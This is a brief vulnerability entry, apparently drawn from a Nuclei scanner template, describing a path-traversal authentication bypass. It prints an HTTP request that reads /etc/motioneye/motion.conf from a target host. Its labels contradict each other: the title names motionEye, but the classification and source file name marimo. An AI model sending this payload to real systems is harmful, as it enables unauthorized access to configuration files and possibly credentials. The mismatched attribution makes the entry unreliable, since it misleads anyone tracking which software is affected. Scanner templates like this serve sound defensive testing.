# Vulnerability: motionEye Partial - Authentication Bypass
**Classification:** MARIMO
**Source:** Nuclei Template (`marimo-auth-bypass.yaml`)

## Description
A path traversal vulnerability allows unauthenticated attackers to access protected resources and bypass authentication controls.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
```

